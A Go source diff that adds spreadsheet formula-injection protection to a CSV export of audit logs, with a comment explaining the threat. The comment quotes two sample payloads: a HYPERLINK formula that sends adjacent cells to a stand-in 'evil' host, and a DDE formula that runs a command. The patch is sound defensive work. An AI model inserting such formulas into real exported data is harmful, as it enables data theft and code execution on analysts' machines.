@@ -792,7 +792,21 @@ func (l *Log) ExportCSV() (string, error) {
 	return sb.String(), nil
 }
 
+// csvQuote renders s as one RFC 4180 CSV field AND neutralizes spreadsheet
+// formula injection. Audit rows carry attacker-controlled capture data (SSIDs,
+// NFC URIs, evil-portal credentials, filenames); a cell beginning with '=',
+// '+', '-', '@', TAB, or CR is interpreted as a formula by Excel / LibreOffice
+// / Google Sheets on import — e.g. =HYPERLINK("http://evil/"&A1) exfiltrates
+// adjacent cells and =cmd|'/c calc'!A1 runs a command on the analyst's machine.
+// Such a cell often contains no comma/quote/newline, so RFC 4180 quoting alone
+// leaves it bare and live. Prefixing it with a single quote makes every major
+// spreadsheet treat the cell as literal text. The export is explicitly meant
+// for spreadsheet import, so this neutralization runs before the field quoting.
+// (The markdown export already neutralizes its own metacharacters via mdEscape.)
 func csvQuote(s string) string {
+	if s != "" && strings.ContainsRune("=+-@\t\r", rune(s[0])) {
+		s = "'" + s
+	}
 	if strings.ContainsAny(s, ",\"\n\r") {
 		return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
 	}
